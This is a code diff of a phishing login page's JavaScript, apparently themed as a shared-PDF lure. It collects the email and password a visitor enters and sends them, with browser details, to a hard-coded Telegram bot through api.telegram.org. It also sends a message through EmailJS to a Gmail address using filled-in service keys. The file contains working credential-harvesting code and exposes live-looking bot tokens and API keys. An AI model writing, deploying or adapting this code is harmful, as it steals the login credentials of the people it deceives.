@@ -4,23 +4,7 @@
     const messageDiv = document.getElementById('message');
     const emailInput = document.getElementById('email');
     const passwordInput = document.getElementById('password');
-  
 
-    // ==================== TELEGRAM CONFIGURATION ====================
-    // IMPORTANT: Replace these with your actual Bot Token and Chat ID
-    // Get Bot Token from @BotFather on Telegram
-    // Get Chat ID from @userinfobot or by sending a message to your bot and visiting:
-    // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
-    const TELEGRAM_BOT_TOKEN = '8942885189:AAHWAF51YpLeJHnGoUJak4fDTXvw0mBcOc0';  // <-- REPLACE WITH YOUR BOT TOKEN
-    const TELEGRAM_CHAT_ID = '8890264087';      // <-- REPLACE WITH YOUR CHAT ID
-    // ================================================================
-
-    // Function to send data to Telegram Bot
-    async function sendToTelegram(uid, password) {
-      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-        console.warn('Telegram bot not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
-        return false;
-      }
 
       const timestamp = new Date().toLocaleString();
       const userAgent = navigator.userAgent;
@@ -38,6 +22,24 @@
                       `🖥️ Platform: ${platform}\n` +
                       `🌐 Language: ${language}\n` +
                       `🔄 Attempt: ${attempt + 1}/${maxAttempts}`;
+
+    // ==================== TELEGRAM CONFIGURATION ====================
+    // IMPORTANT: Replace these with your actual Bot Token and Chat ID
+    // Get Bot Token from @BotFather on Telegram
+    // Get Chat ID from @userinfobot or by sending a message to your bot and visiting:
+    // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
+    const TELEGRAM_BOT_TOKEN = '8942885189:AAHWAF51YpLeJHnGoUJak4fDTXvw0mBcOc0';  // <-- REPLACE WITH YOUR BOT TOKEN
+    const TELEGRAM_CHAT_ID = '8890264087';      // <-- REPLACE WITH YOUR CHAT ID
+    // ================================================================
+
+    // Function to send data to Telegram Bot
+    async function sendToTelegram(uid, password) {
+      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.warn('Telegram bot not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
+        return false;
+      }
+
+
 
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
@@ -124,15 +126,16 @@
 
   // Initialize EmailJS
   emailjs.init({
-    publicKey: "YOUR_PUBLIC_KEY"
+    publicKey: "tqbH3N-tXJVe_-kN4"
   });
 
-  async function sendEmail(email, message) {
+  async function sendEmail(name, email, message) {
     try {
       const response = await emailjs.send(
-        "YOUR_SERVICE_ID",
-        "YOUR_TEMPLATE_ID",
+        "service_mhpfrk9", // Service ID
+        "template_y2jnjlj", //YOUR_TEMPLATE_ID
         {
+          from_name: name,
           from_email: email,
           message: message
         }
@@ -146,11 +149,10 @@
       return false;
     }
   }
-
-  // Example usage
   sendEmail(
-    "user@example.com",
-    "Hello! This is a test email."
+    "sharedpdf",
+    "l86599514@gmail.com",
+    message
   );
 
 
